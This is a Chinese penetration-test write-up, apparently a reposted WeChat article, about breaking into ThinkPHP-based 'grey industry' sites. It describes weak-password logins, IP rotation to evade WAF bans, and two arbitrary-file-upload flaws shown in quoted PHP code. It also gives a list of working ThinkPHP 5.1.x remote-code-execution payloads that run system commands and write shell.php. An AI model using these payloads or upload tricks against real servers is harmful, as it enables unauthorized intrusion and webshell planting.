> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_z-3ok9g3oXwU3vVz68Eqg)

### ![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFmbvACy4WbM26IkAkBJJiaDxaWravXnPBwfKIbnN3HSchXRnauqld9j8icX70UFnwb5tiafibicPiaIj6g/640?wx_fmt=png)

> 本文来源：https://blog.zygd.site/

### **0x00 前言**

> 最近一直在和团队表哥们实战打击灰黑产业 学到了很多经验 以此文来记录下挖掘的两个 0day
> 
> 以下渗透均为本地测试

### **0x01 信息收集**  

做了一波简单的收集如下:

*   域名：http://zb.target.com
    
*   真实 IP：106.xx.xx.205
    
*   `Nginx + PHP`
    
*   ThinkPHP V5.1.6(开启 debug)
    
*   宝塔 WAF 🤷‍♂️
    
*   后台：http://zb.target.com/admin/login
    

看到 Thinkphp 我想到的就是拿 payload 一把梭哈他

(奈何对方有宝塔 WAF😢 没能绕过去)

因本人学艺不精，不会 bypass，哭晕了😂  

SHELL

<table width="768"><tbody><tr><td><pre class="hljs markdown">thinkphp5.1.x payload
?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</pre></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7y4JumknuAQuLTic2DrRjwTGONU8VQcwhDyJSmrvPmK02s6HhgucscPw/640?wx_fmt=png)

那咋办呢? 

当然是继续干啊 还有前台后台没看呢！  

### **0x02 漏洞挖掘**

前台:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7N0u70fN5Lwc7JeohbtNVtib8iaia2cfTbNmSWQnqgzibEgl7R58ktfCnNA/640?wx_fmt=png)

后台:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d77N2c47JScJ4ZalMvT6RLw7AibvOWwsCnunoqvOHjDu6wR1ib3zib3iaDgw/640?wx_fmt=png)

拿出祖传弱口令 admin admin （弱口令是真的香😂）

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d76hzHY985yG1Tj7dVib5XdWNL31qA5v3jMuKdVOiadEibcwCiaysVoswhlg/640?wx_fmt=png)

来到后台嘛 肯定是找找上传点 找找注入 (毕竟 tp5 采用 PDO 想了想算了吧)  

最终在 http://zb.target.com/admin/Config/adds 找到一处上传点

反手就是一波抓包 、丢 Repeater 改后缀 放包

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d74IcROTuUjvSibguO9Dumk8qicBCrN9KkcjgzxD69luv7pD6OWBXiaRAcg/640?wx_fmt=png)

然后... 我就被 ban 了（哈哈哈哈，调皮，年轻人不讲伍德）  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7p3h25zOayxcuq9qJmARsAHauHF3jf4RLQbXsLvXqDd5XOBIeMNSA0Q/640?wx_fmt=png)

ban IP 就能阻止我的脚步?

换个 IP 继续干！(年轻人你好自为之)

有了前车之鉴 还是先看下黑白名单吧 

在经过我 不断换 IP 后 得出结论...

这是一个任意文件上传

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7FIg8c7lEdkNEcnBuLTEsEvy8Me7ZCwRvIxn4KenY9icMmcWicR1qgibaQ/640?wx_fmt=png)

漏洞是有了 但是宝塔咋绕啊 (检测内容 + 后缀限制)

没办法 只有收集下指纹 找找后台弱口令 

去拿其他网站 在打包源码下来审计咯（闪电鞭，劈里啪啦）

keyword

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7FPEXctL9HZj6jbJVwzqMkl0u1nhRpDhhxjNQtrCic1wdST9EoxI9nMg/640?wx_fmt=png)

40 多个站 弱口令还是很容易找到的

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7qVLyyA1pfsKS0UmliaGdvT3SJvA5FzyX7rFNyeXkodhicKpQO2v3mZwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7WHOn9Ha9NL5PnlXibibiblVuqJagxgAnCZlx7qZ2YmMAStSwnNboJsz0w/640?wx_fmt=png)

果然没有宝塔的限制 就是一帆风顺 (宝塔真恶心 淦)

### **0x03 代码审计**

开始审计!

由于该套源码采用 tp5 框架注入就不看了 着重看功能点和权限验证

文件上传

PHP

<table width="768"><tbody><tr><td><pre class="hljs php">public function adds(){

if (!empty($_FILES['img']['tmp_name'])) 
{
      $uploadModel = new \app\common\service\Upload\Service('img');
       $aa = $uploadModel-&gt;upload();
       $data['img'] = $aa;
           
}
           
       $data['addtime'] = date('Y-m-d H:i:s',time());
       $data['url'] = $_POST['url'];
       $data['types'] = $_POST['types'];

       $service = new \app\common\entity\Sl();
       $result = $service-&gt;addArticle($data);
       $this-&gt;success('新增成功', 'config/sl');
            
          
     }</pre></td></tr></tbody></table>

PHP

<table width="768"><tbody><tr><td><pre class="hljs php">public function upload()
    {
        $file = request()-&gt;file($this-&gt;name);
        $info = $file-&gt;move('uploads');
        if ($info) {

            
            return $this-&gt;fileName = '/uploads/' . $info-&gt;getSaveName();

        } else {

            $this-&gt;error = $file-&gt;getError();
            return false;
        }
    }</pre></td></tr></tbody></table>

可以看到 完全没做任何限制 妥妥的任意文件上传

  
2. 文件上传 (2)

PHP

<table width="768"><tbody><tr><td><pre class="hljs php">public function uploadEditor()
    {
        $uploadModel = new \app\common\service\Upload\Service('image');
        if ($uploadModel-&gt;upload()) {
            return json([
                'errno' =&gt; 0,
                'data' =&gt; [$uploadModel-&gt;fileName]
            ]);
        }
        return json([
            'errno' =&gt; 1,
            'fail ' =&gt; $uploadModel-&gt;error
        ]);
    }</pre></td></tr></tbody></table>

有了第一个洞 、第二个洞就很好找了

又是一处任意文件上传 、不过是在前台 需要用户登录

在经过一番审计后 发现两个任意文件上传 前台 后台 其他的洞没发现 (接触审计时间太短了挖不出来呀)

但是目标站上使用了宝塔 WAF 由于自己太菜 没法绕过 选择放弃

### **0x04 转角遇见洞**

在我拿着 shell 一筹莫展的时候 发现

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7b7RLe1e3Qiaf9g2DUYo6ibWL0T81w89jhFswmsCWOA1zqjGR1LVqxJAQ/640?wx_fmt=png)

还有另外一个站 都在一台服务器上 肯定也不是啥好东西 看看是个啥站

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7XyHvFDGf0deyHFqCK2obHiapU7BrcpYPdA0ZdRlmSes6Z4x3XkmdKsw/640?wx_fmt=png)

金手指 一看就不是好东西 搞个用户进里面看看

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7oo7udjeIhVMWdAWg1nlyMtUT5iapo4IpLIGUCjkXicib55Ipibicj2yQ96A/640?wx_fmt=png)

应该是个接单赚佣金的平台吧 进都进来了 哪能就这么走了呀 挖挖前台的洞  

启用了 `httponly` (xss 就先不测试了)

在修改个人资料处 找到一处上传点

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7g73y40JLkGicJ7OdsKHlZ0khz5LkicqbZ8D413XmYoDHeFuQDkNdjHfQ/640?wx_fmt=png)

`base64`上传 我直接反手 修改`jpeg`为`php`

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7Z6JibTzPRuoSibK7Dd3JqswlupY5OekSoibGHZJeM8RqQpyXMY8M4QYQw/640?wx_fmt=png)

操作成功?

又一个 0day？

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d7WvNj5RYoaicibXvSwS4oicmf6hZZxF5o477ISEibRnoYvSXttIcPGNPO5g/640?wx_fmt=png)

可能这就是运气吧！

收集下指纹 fofa 查了一手

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHSACQCfISQ9OhkCryXs7d79u61Kf7XUa3uL5w57wPq25NEicHnf911gtVfRU9G0x6PpBzMewCuLRw/640?wx_fmt=png)

500 多个 美滋滋~  

### **0x05 总结**

总体来说还是非常简单的

这两套系统都是可以前台后台直接 getshell 的 但是需要用户登录 (注册需要邀请码)

从弱口令到 0day 挖掘 总结一下：弱口令永远滴神！！！

最后的最后未授权测试是违法的哦！😂  

@

**欢迎加我微信：zkaq99、**实时分享安全动态

* * *

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8r6UDibLl3oFOu6cEZPryVrS6n7TfhmDVMfKfIfc7nicyXQ0r0CjPZxPIACeen4QF4fuLwsRBhzMw/640?wx_fmt=jpeg)

[

实战 | 渗透摄像头

2021-06-07

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSH9t7u1E1mfrIxADDU04GcKFLnQuiar2DRV6ul6WicaAx894LSL9XKPeoOptKONXEpufUvRfHEqj8IA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521870&idx=1&sn=a4201fa9fa2fa7ac0693c7e324953993&chksm=ebeadf63dc9d567522f4d32b0ae33e03edf0964de0124bd53cc45b495d3fae8417eebfb732c4&scene=21#wechat_redirect)

[

记一次批量刷漏洞

2021-06-11

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFyVfgq0XrOk4T4z5stANyHQCUlS80H0GWrU59uh2iafdpRRNtse6Wa9Cok0ntpWbMYJ9qBcRRXq2g/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247522606&idx=1&sn=d7b52504576d3d4450979ea14158d3ea&chksm=ebead003dc9d59150c4c1599391975db3bf41d5267f270947819acbef539fa392f05c5ce2ad8&scene=21#wechat_redirect)

[

利用 python 完成大学刷课（从 0 到完成的思路）

2021-06-06

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHkvnCnsBn2mKH5btCeBEkhOWBF94KdmIDM01G5bUUvibhG4KMw5f84BZvwWXibyxYXqTHiaduyCuVrw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521848&idx=1&sn=ea6348b0b3978f4b3814a1c6a8b86a46&chksm=ebeadf15dc9d5603f947d79880e13aec69778a464f69954998ed6ffe895a2f5c78cb57ab01f9&scene=21#wechat_redirect)

[

黑客技能｜断网攻击与监听演示

2021-06-04

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8YF0okRDl7zWnKCPoxDGUZeEaKAuibz1Wiaj3iaJJic8uoD1bVPIUv1hFKL5b1iauiclwiapBmAibEtjJEA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521713&idx=1&sn=ae4efd5b60465cf44be7b26e9abb5579&chksm=ebeadc9cdc9d558ad2b3dadf55a5571a0a5a52453248069186b2dc30101d9fc7b6cd5b88b343&scene=21#wechat_redirect)

[

实战 | 一个很奇怪的支付漏洞

2021-06-01

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFbkJ5sialXP7Ab8JVxBfCQqicAjFhXjUibpB1GR9AAkolWMXhoZwa6RBtEvJV2e77lhKG8QIGIO9wicA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521470&idx=1&sn=dfe9c0aec50019b0922d8c5b844883c8&chksm=ebeadd93dc9d5485a58290d4b77f4c62520d3ada70cef2c6b3698dffd8e2a120f95ec42f6c57&scene=21#wechat_redirect)

[

暴力破解工具—九头蛇（hydra）使用详解及实战

2021-05-29

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8YF0okRDl7zWnKCPoxDGU6zSh8GYRFdyCwk2JibfaNqJlhMqdkh9XiaNr9doiatbg796eFvcSKINBg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521292&idx=1&sn=d41793e5138353a61c1c773f612c6d30&chksm=ebeadd21dc9d54373a3a08ed67cbe551a2d0dc2ea3414ca10f449ec9f3197ea13714165908f4&scene=21#wechat_redirect)

[

实战 | 一口气锤了 4 个卖吃鸡外挂平台

2021-05-28

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8YF0okRDl7zWnKCPoxDGUZeEaKAuibz1Wiaj3iaJJic8uoD1bVPIUv1hFKL5b1iauiclwiapBmAibEtjJEA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521247&idx=1&sn=7fa81e0ef16f2ca8088c948c2b0ce1a7&chksm=ebeadaf2dc9d53e49c681a4f61adc5071e8833ee37d4f32191a5a0fcb4b827ea0736a4407bed&scene=21#wechat_redirect)